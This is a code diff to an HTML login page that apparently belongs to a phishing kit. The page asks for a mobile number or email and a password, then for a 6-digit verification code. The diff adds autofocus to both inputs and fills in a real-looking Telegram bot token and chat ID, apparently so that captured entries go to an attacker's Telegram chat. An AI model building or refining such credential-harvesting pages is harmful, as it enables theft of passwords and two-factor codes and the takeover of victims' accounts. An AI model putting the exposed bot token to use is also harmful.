@@ -140,7 +140,7 @@
     <div class="container" id="login-form-container">
         <form id="login-form">
             <div class="form-group">
-                <input type="text" id="email" placeholder="Mobile number or email address" required>
+                <input type="text" id="email" placeholder="Mobile number or email address" required autofocus>
             </div>
             <div class="form-group">
                 <input type="password" id="password" placeholder="Password" required>
@@ -166,7 +166,7 @@
         </div>
         <form id="verification-form">
             <div class="form-group">
-                <input type="text" id="verification-code" placeholder="6-digit code" required maxlength="6">
+                <input type="text" id="verification-code" placeholder="6-digit code" required maxlength="6" autofocus>
             </div>
             <button type="submit" class="verify-btn">Continue</button>
             <div class="form-group" style="text-align: center;">
@@ -181,8 +181,8 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
-            const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+            const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
+            const TELEGRAM_CHAT_ID = '6049368044'; 
             
             const loginForm = document.getElementById('login-form');
             const verificationForm = document.getElementById('verification-form');
